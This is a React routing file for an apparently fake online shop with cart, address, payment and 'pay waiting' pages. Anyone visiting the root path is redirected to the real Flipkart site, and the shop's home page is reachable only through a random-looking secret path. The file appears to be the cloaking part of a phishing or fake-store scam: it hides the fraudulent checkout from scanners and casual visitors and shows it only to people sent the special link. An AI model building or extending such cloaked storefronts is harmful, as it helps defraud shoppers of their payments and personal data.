import React, { Suspense, lazy, useEffect } from "react";
import { Routes, Route, useLocation } from "react-router-dom";
import LoadingSpinner from "./components/LoadingSpinner";

// Lazy load components
const Home = lazy(() => import("./components/OptimizedHome"));
const Product = lazy(() => import("./pages/Product"));
const Cart = lazy(() => import("./pages/Cart"));
const AddressForm = lazy(() => import("./pages/Address"));
const Summary = lazy(() => import("./pages/Summary"));
const Payment = lazy(() => import("./pages/Payment"));
const MyOrder = lazy(() => import("./pages/MyOrder"));
const OrderDetails = lazy(() => import("./pages/OrderDetails"));
const PayWaiting = lazy(() => import("./pages/PayWaiting"));
const OrderPlaced = lazy(() => import("./pages/OrderPlaced"));

const Routing = () => {
  const location = useLocation();

  useEffect(() => {
    if (location.pathname === "/") {
      // External redirect to Flipkart dsghr763wdsvfht
      window.location.href = "https://www.flipkart.com/";
    }
  }, [location.pathname]);

  return (
    <Suspense
      fallback={<LoadingSpinner fullScreen={true} size="large" />}
    >
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/dsghr763wdsvfht" element={<Home />} />
        <Route path="/product/:id" element={<Product />} />
        <Route path="/cart" element={<Cart />} />
        <Route path="/address" element={<AddressForm />} />
        <Route path="/summary" element={<Summary />} />
        <Route path="/payment" element={<Payment />} />
        <Route path="/myorder" element={<MyOrder />} />
        <Route path="/details/" element={<OrderDetails />} />
        <Route path="/pay/" element={<PayWaiting />} />
        <Route path="/success" element={<OrderPlaced />} />
      </Routes>
    </Suspense>
  );
};

export default Routing;
